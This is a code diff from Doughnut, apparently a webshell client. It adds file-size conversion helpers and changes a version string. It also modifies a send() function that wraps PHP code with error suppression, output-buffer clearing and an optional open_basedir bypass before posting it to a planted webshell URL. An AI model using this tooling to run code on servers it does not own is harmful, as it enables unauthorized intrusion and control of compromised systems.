@@ -1,4 +1,5 @@
 from os import path
+from re import match, sub
 from base64 import b64decode, b64encode
 from binascii import b2a_hex
 from locale import getpreferredencoding
@@ -28,6 +29,7 @@ SYSTEM_TEMPLATE = None
 Session = requests.Session()
 LOCAL_ENCODING = getpreferredencoding()
 ALPATHNUMERIC = ascii_letters + digits
+UNITS = {"B": 1, "KB": 2**10, "MB": 2**20, "GB": 2**30, "TB": 2**40}
 
 
 disable_warnings()
@@ -76,7 +78,7 @@ def banner():
 
 """
         )
-    print(color.green("Doughnut Version: 4.1.0\n"))
+    print(color.green("Doughnut Version: 4.1\n"))
 
 
 def base64_encode(data: str, encoding="utf-8"):
@@ -121,6 +123,21 @@ def gzdeflate(data: bytes) -> bytes:
     compressed = compressor.compress(data)
     compressed += compressor.flush()
     return compressed
+
+
+def size_to_human(num, suffix='B'):
+    for unit in ['', 'K', 'M', 'G', 'T', 'P', 'E', 'Z']:
+        if abs(num) < 1024.0:
+            return "%3.1f %s%s" % (num, unit, suffix)
+        num /= 1024.0
+    return "%.1f%s%s" % (num, 'Yi', suffix)
+
+def human_to_size(size):
+    size = size.upper()
+    if not match(r' ', size):
+        size = sub(r'([KMGT]?B)', r' \1', size)
+    number, unit = [string.strip() for string in size.split()]
+    return int(float(number)*UNITS[unit])
 
 
 def clean_trace():
@@ -277,7 +294,7 @@ def send(phpcode: str, raw: bool = False, **extra_params):
     if ("quiet" in extra_params):
         del extra_params["quiet"]
         quiet = True
-
+    
     url = gget("webshell.url", "webshell")
     params_dict = gget("webshell.params_dict", "webshell").copy()
     php_v7 = gget("webshell.v7", "webshell")
@@ -299,7 +316,7 @@ def send(phpcode: str, raw: bool = False, **extra_params):
 $encode = mb_detect_encoding($ooDoo, array('ASCII','UTF-8',"GB2312","GBK",'BIG5','ISO-8859-1','latin1'));
 $ooDoo = mb_convert_encoding($ooDoo, 'UTF-8', $encode);
 print(base64_encode($ooDoo));""" if encode_recv else ""
-        phpcode = f"""error_reporting(0);{encode_head}chdir(base64_decode("{pwd_b64}"));print("{head}");""" + phpcode
+        phpcode = f"""error_reporting(0);ob_end_clean();{encode_head}chdir(base64_decode("{pwd_b64}"));print("{head}");""" + phpcode
         if (gget("webshell.bypass_obd", "webshell")):
             phpcode = """$dir=pos(glob("./*", GLOB_ONLYDIR));
 $cwd=getcwd();
